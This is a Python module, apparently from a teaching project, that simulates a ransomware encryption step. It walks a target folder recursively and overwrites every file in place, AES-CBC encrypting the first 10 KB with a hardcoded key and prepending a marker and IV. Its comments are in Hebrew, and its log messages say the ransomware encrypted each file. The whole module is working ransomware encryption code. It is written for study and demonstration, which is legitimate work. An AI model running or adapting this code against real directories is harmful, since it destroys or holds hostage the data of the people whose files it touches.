"""Utility for encrypting files in the target folder.

This module simulates a ransomware encryption step. It walks the
``TARGET_FOLDER`` and encrypts the beginning of each file using AES. The
original data is replaced with a marker so the decryption routine can
restore it later. Each action is recorded in the summary log so students
can see which files were affected.
"""

import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from modules.utils import log_action
from modules.utils import log_summary
from modules.constants import TARGET_FOLDER


# מפתח קבוע (32 bytes == 256bit)
KEY = bytes.fromhex("3031323334353637383961626364656630313233343536373839616263646566")
SIGNATURE = b"BME1"
CHUNK_SIZE = 10 * 1024

def encrypt_files(folder: str = TARGET_FOLDER):
    """Encrypt all files under ``folder``.

    Only the first ``CHUNK_SIZE`` bytes of each file are encrypted and
    prefixed with ``SIGNATURE`` and a random IV. The rest of the file is
    left intact to simplify the demo. Errors are logged but do not stop
    the processing of remaining files.
    """

    for root, _, files in os.walk(folder):  # מעבר רקורסיבי על כל הקבצים
        for name in files:
            # הרכב נתיב מלא לקובץ הנוכחי
            path = os.path.join(root, name)
            try:
                # קריאה בינארית של תוכן הקובץ המקורי
                with open(path, "rb") as f:
                    data = f.read()

                header = data[:CHUNK_SIZE]
                tail = data[CHUNK_SIZE:]

                iv = os.urandom(16)  # וקטור Initialization אקראי להצפנה
                cipher = AES.new(KEY, AES.MODE_CBC, iv)  # יצירת אובייקט צופן AES
                encrypted_header = cipher.encrypt(pad(header, AES.block_size))  # הצפן את חלק הכותרת

                # כתיבה חזרה של הנתונים המוצפנים לקובץ
                with open(path, "wb") as f:
                    f.write(SIGNATURE + iv + encrypted_header + tail)
                
                
                log_summary(f"הכופר הצפין את הקובץ: {path}", "fail")
            except Exception as e:
                log_action(f"שגיאה בהצפנה {path}: {str(e)}")
